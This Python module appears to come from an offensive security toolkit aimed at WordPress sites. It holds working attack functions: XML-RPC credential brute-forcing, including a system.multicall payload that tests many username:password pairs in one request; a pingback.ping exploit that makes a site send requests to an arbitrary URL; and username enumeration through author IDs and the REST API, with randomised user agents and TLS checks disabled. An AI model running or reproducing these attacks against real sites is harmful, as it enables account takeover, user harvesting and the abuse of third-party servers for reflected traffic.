import requests,random,json,sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bane.payloads import ua
if  sys.version_info < (3,0):
 from urlparse import urlparse
else:
 from urllib.parse import urlparse

def wp_xmlrpc_methods(u,user_agent=None,cookie=None,path='/xmlrpc.php',timeout=10,proxy=None):
 if proxy:
  proxy={'http':'http://'+proxy}
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 hed={"User-Agent":us}
 if cookie:
  hed.update({"Cookie":cookie})
 u+=path
 post ="""
 <?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
"""
 try:
  r = requests.post(u, data=post,headers = hed,proxies=proxy,timeout=timeout, verify=False)
  return [ x.replace('</string></value>','').replace('<value><string>','').strip() for x in r.text.split('<data>')[1].split('</data>')[0].strip().split('\n')]
 except:
  pass
 return []


def wp_xmlrpc_bruteforce(u,user_agent=None,cookie=None,path='/xmlrpc.php',timeout=10,proxy=None):
 if proxy:
  proxy={'http':'http://'+proxy}
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 hed={"User-Agent":us}
 if cookie:
  hed.update({"Cookie":cookie})
 u+=path
 post ="""
 <?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
"""
 try:
  r = requests.post(u, data=post,headers = hed,proxies=proxy,timeout=timeout, verify=False)
  if "wp.getUsersBlogs" in [ x.replace('</string></value>','').replace('<value><string>','').strip() for x in r.text.split('<data>')[1].split('</data>')[0].strip().split('\n')]:
   return True
 except:
  pass
 return False
 

def wp_xmlrpc_mass_bruteforce(u,user_agent=None,cookie=None,path='/xmlrpc.php',timeout=10,proxy=None):
 if proxy:
  proxy={'http':'http://'+proxy}
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 hed={"User-Agent":us}
 if cookie:
  hed.update({"Cookie":cookie})
 u+=path
 post ="""
 <?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
"""
 try:
  r = requests.post(u, data=post,headers = hed,proxies=proxy,timeout=timeout, verify=False)
  l=[ x.replace('</string></value>','').replace('<value><string>','').strip() for x in r.text.split('<data>')[1].split('</data>')[0].strip().split('\n')]
  if ("wp.getUsersBlogs" in l) and ("system.multicall" in l):
   return True
 except:
  pass
 return False

def wp_xmlrpc_pingback(u,user_agent=None,test_url="https://www.google.com/",cookie=None,path='/xmlrpc.php',timeout=10,proxy=None):
 if proxy:
  proxy={'http':'http://'+proxy}
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 hed={"User-Agent":us}
 if cookie:
  hed.update({"Cookie":cookie})
 u+=path
 post ="""
 <?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
"""
 try:
  r = requests.post(u, data=post,headers = hed,proxies=proxy,timeout=timeout, verify=False)
  l=[ x.replace('</string></value>','').replace('<value><string>','').strip() for x in r.text.split('<data>')[1].split('</data>')[0].strip().split('\n')]
  if "pingback.ping" in l:
   return True
 except:
  pass
 return False


def wp_xmlrpc_pingback_exploit(u,user_agent=None,target_url="https://www.google.com/",cookie=None,path='/xmlrpc.php',timeout=10,proxy=None):
 url=u.split('://')[0]+"://"+urlparse(u).netloc
 if proxy:
  proxy={'http':'http://'+proxy}
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 hed={"User-Agent":us}
 if cookie:
  hed.update({"Cookie":cookie})
 url+=path
 post ="""<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>"""+target_url+"""</string></value>
</param>
<param>
<value><string>"""+u+"""</string></value>
</param>
</params>
</methodCall>
"""
 try:
  r = requests.post(url, data=post,headers = hed,proxies=proxy,timeout=timeout, verify=False)
 except:
  pass



def wpadmin(u,username,password,user_agent=None,cookie=None,path='/xmlrpc.php',timeout=10,proxy=None):
 '''
   this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 hed={"User-Agent":us}
 if cookie:
  hed.update({"Cookie":cookie})
 u+=path
 post ="""<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>{}</value></param>
<param><value>{}</value></param>
</params>
</methodCall>""".format(username,password)
 try:
  r = requests.post(u, data=post,headers = hed,proxies=proxy,timeout=timeout, verify=False)
  if "isAdmin" in r.text:
   return True
 except:
  pass
 return False

def wpadmin_mass(u,word_list=[],user_agent=None,cookie=None,path='/xmlrpc.php',timeout=10,proxy=None):
 '''
   this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False
'''
 if proxy:
  proxy={'http':'http://'+proxy}
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 hed={"User-Agent":us}
 if cookie:
  hed.update({"Cookie":cookie})
 u+=path
 post="""
 <?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
 """
 for x in word_list:
  post +="""<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array>
  <data><value><array><data><value><string>{}</string></value><value><string>{}</string></value>
  </data></array></value></data></array></value></member></struct></value>
""".format(x.split(':')[0],x.split(':')[1])
 post+="""
</data></array></value></param></params></methodCall>
 """
 try:
  r = requests.post(u, data=post,headers = hed,proxies=proxy,timeout=timeout, verify=False)
  l=r.text.split('<array><data>')[1].split('</array></data>')[0].strip().split("</struct></value>")
  for x in l:
   if "Incorrect username or password" not in x:
    return word_list[l.index(x)]
 except:
  pass
 return ""


def wp_users(u,path='/wp-json/wp/v2/users',timeout=10,user_agent=None,cookie=None,proxy=None):
 '''
   this function is to get WP users
'''
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 hed={"User-Agent":us}
 if cookie:
  hed.update({"Cookie":cookie})
 if proxy:
  proxy={'http':'http://'+proxy}
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 u+=path
 try:
  r=requests.get(u, headers = hed,proxies=proxy,timeout=timeout, verify=False)
  if ('{"id":'in r.text) and('"name":"' in r.text):
   a= json.loads(r.text)
   users=[]
   for x in range(len(a)):
    users.append({'id':a[x]['id'],'slug':a[x]['slug'],'name':a[x]['name']})
   return users
 except Exception as e:
  pass

def wp_user(u,path='/wp-json/wp/v2/users/',user=1,user_agent=None,cookie=None,timeout=10,proxy=None):
 '''
   this function is to return all informations about a WP user with a given index integer
'''
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 hed={"User-Agent":us}
 if cookie:
  hed.update({"Cookie":cookie})
 if proxy:
  proxy={'http':'http://'+proxy}
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 u+=path+str(user)
 try:
  r=requests.get(u, headers = hed,proxies=proxy,timeout=timeout, verify=False)
  if ('{"id":'in r.text) and('"name":"' in r.text):
   return json.loads(r.text)
 except Exception as e:
  pass
 

def wp_users_enumeration(u,path='/',timeout=15,user_agent=None,cookie=None,proxy=None,start=1,end=20,logs=True):
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 hed={"User-Agent":us}
 if cookie:
  hed.update({"Cookie":cookie})
 d=u.split('://')[1].split("/")[0]
 u=u.split(d)[0]+d
 if proxy:
  proxy={'http':'http://'+proxy}
 l=[]
 for x in range(start,end+1):
  try:
      r=requests.get(u+path+"?author="+str(x),headers = hed,proxies=proxy,timeout=timeout, verify=False).text
      a=r.split('<meta property="og:title" content="')[1].split('>')[0]
      if ',' in a:
       a=a.split(',')[0]
       l.append((x,a))
       if logs==True:
          print("[+]Username found: {} | ID: {}".format(a.encode("utf-8","replace"),x))
  except KeyboardInterrupt:
      break
  except:
      pass
 return l

def wp_version(u,timeout=15,user_agent=None,cookie=None,proxy=None):
 if user_agent:
  us=user_agent
 else:
  us=random.choice(ua)
 hed={"User-Agent":us}
 if cookie:
  hed.update({"Cookie":cookie})
 if proxy:
  proxy={'http':'http://'+proxy}
 try:
  r=requests.get(u,headers = hed,proxies=proxy,timeout=timeout, verify=False).text
  return r.split('<meta name="generator" content="')[1].split('"')[0].strip().split(' ')[1]
 except:
  pass
